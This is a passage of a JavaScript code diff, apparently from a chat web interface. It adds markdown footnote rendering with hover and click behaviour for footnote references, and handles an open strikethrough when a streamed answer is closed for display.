+        while(i<L.length&&(/^ {2,}\S/.test(L[i])||(!L[i].trim()&&i+1<L.length&&/^ {2,}\S/.test(L[i+1])))){note.push(L[i].replace(/^ {1,4}/,""));i++;}
+        if(!fnDefs.has(k))fnDefs.set(k,note.join("\n"));
+        continue;}
+      const p=[l.trim()];i++;
+      while(i<L.length&&L[i].trim()&&!starts(L[i])&&!isSetext(L[i])){p.push(L[i].trim());i++;}
+      // setext headers (small models love them: text over ----- / =====): the line over the underline
+      if(i<L.length&&isSetext(L[i])&&p[p.length-1].length<=90){
+        const hd=p.pop(),k=/=/.test(L[i])?1:2;if(p.length)push(para(p));
+        push("<h"+k+">"+inl(hd)+"</h"+k+">");i++;continue;}
+      push(para(p));
+    }
+    return {h:out.join(""),gap:gap};
+  };
+  s=blocks(s,false).h;
+  // the notes, under everything, in the order their refs appeared
+  if(fnDefs.size){
+    for(const k of fnDefs.keys())fnNum(k);
+    const notes=[...fnDefs].map(([k,v])=>[fnNum(k),v]).sort((a,b)=>a[0]-b[0]);
+    s+='<section class="fnotes" aria-label="Notes"><ol>'+notes.map(([n,v])=>'<li data-fn="'+n+'" data-n="'+n+'" value="'+n+'">'
+      +blocks(v,true).h.split(P0).join("").split(P1).join("")+"</li>").join("")+"</ol></section>";
+  }
   // the code cards come back whole (6b528), then the think blocks
   s=s.replace(/\u0000CC(\d+)\u0000/g,(_,i)=>ccs[+i]||"");
   s=s.replace(/\u0000DL(\d+)\u0000/g,(_,i)=>dlBox(dls[+i]));
@@ -58898,6 +59099,19 @@ inner.addEventListener("mouseover",e=>{
   const a=citeChip(c);
   if(a){c.title=(a.title||"")+" — "+a.textContent;c.dataset.titled="1";}
 });
+// FOOTNOTES (6b623): a ref shows its note on hover and brings it into view on a click; the note is the one in the
+// same answer (ids would repeat across answers, so none are used)
+const fnNote=c=>{const b=c.closest(".body");return b?b.querySelector('.fnotes li[data-fn="'+(parseInt(c.dataset.fn,10)||0)+'"]'):null;};
+inner.addEventListener("click",e=>{
+  const c=e.target.closest&&e.target.closest("sup.fnref");
+  const n=c&&fnNote(c);
+  if(n){e.preventDefault();n.scrollIntoView({block:"nearest",behavior:matchMedia("(prefers-reduced-motion: reduce)").matches?"auto":"smooth"});}
+});
+inner.addEventListener("mouseover",e=>{
+  const c=e.target.closest&&e.target.closest("sup.fnref");
+  const n=c&&!c.dataset.titled&&fnNote(c);
+  if(n){c.title=n.textContent.trim().slice(0,200);c.dataset.titled="1";}
+});
 // YOUR STUFF (6b530): a personal pill opens its chat, or shows its file
 inner.addEventListener("click",e=>{
   const a=e.target.closest&&e.target.closest(".srcchip.know");
@@ -59520,14 +59734,13 @@ function hzNextStop(s,p,ended){
   let e=q;while(e<n&&s.charCodeAt(e)>32)e++;
   return e>=n&&!ended?null:e;
 }
-// a part-written answer, closed for the renderer: an open code fence, an open inline code, an open bold; so the words
-// already in place never change their look when the closer arrives
+// a part-written answer, closed for the renderer: an open code fence, an open inline code, an open ~~strike~~ (6b623),
+// an open bold; so the words already in place never change their look when the closer arrives
 function hzMdClose(t){
   const f=(t.match(/^[ \t]*```/gm)||[]).length;if(f%2)return t+(t.endsWith("\n")?"":"\n")+"```";
-  const blk=t.slice(t.lastIndexOf("\n\n")+1),nc=blk.replace(/`[^`\n]*`/g,"");let out=t;
-  const tick=(nc.match(/`/g)||[]).length%2===1;
-  if(((tick?nc.replace(/`[^`]*$/,""):nc).match(/\*\*/g)||[]).length%2){out+=tick?"`**":"**";}else if(tick)out+="`";
-  return out;
+  const blk=t.slice(t.lastIndexOf("\n\n")+1),nc=blk.replace(/`[^`\n]*`/g,"");
+  const tick=(nc.match(/`/g)||[]).length%2===1,ot=tick?nc.replace(/`[^`]*$/,""):nc;
+  return t+(tick?"`":"")+((ot.match(/~~/g)||[]).length%2?"~~":"")+((ot.match(/\*\*/g)||[]).length%2?"**":"");
 }
 // the words of a text, for the draft-to-final diff
 function hzWords(t){return String(t||"").split(/\s+/).filter(Boolean);}
